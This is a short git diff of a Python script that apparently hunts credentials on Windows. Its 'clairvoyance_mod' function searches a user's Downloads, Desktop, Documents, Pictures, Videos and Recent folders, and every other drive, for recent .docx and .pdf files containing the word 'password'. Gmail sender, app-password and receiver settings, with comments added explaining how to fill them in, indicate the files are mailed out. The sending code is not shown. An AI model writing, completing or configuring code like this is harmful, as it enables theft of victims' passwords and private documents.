@@ -18,9 +18,9 @@ from base64 import b64decode
 from json import loads
 
 # The mail addresses and password
-SENDER = ""
-SENDER_P = ""  # Put your app password here
-RECEIVER = ""
+SENDER = ""  # Syntax: <Example.email1@gmail.com>
+SENDER_P = ""  # App password here, 16-character code, all lowercase and no space, Syntax: "<totallyyrealpass>"
+RECEIVER = ""  # Syntax: <Example.email2@gmail.com>
 
 
 def clairvoyance_mod():
@@ -34,9 +34,9 @@ def clairvoyance_mod():
     DETECT_TUPLE = (f"C:\\Users\\{user}\\Downloads", f"C:\\Users\\{user}\\Desktop", f"C:\\Users\\{user}\\Documents",
                     f"C:\\Users\\{user}\\Pictures", f"C:\\Users\\{user}\\Videos",
                     f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Recent")
-    EXTENSION = (".docx", ".pdf")
-    DETECT_KEYWORD = ("password")
-    days = 20  # How many days back to search
+    EXTENSION = (".docx", ".pdf")  # Detect the extension name
+    DETECT_KEYWORD = ("password",)  # detect any keywords within the file, make it lowercase.
+    days = 20  # How many days since last modified back to search
 
     # Add the rest of the drives to the tuple
     drives = [chr(x) + ":" for x in range(65, 91) if os.path.exists(chr(x) + ":")]
